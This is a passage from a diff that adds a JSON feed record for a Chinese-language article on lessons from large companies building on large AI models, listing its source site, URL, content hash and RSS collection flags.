+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "在大模型上 build：三家大公司替你踩过的坑",
+          "url": "https://yage.ai/share/build-vs-buy-enterprise-ai-lessons-20261005.html",
+          "content_sha256": "f57a6c1e885c260f6e08517b57eb2b8a0da1079e02a8c50379d354e743aa4b6a"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    }
+  ]
 }
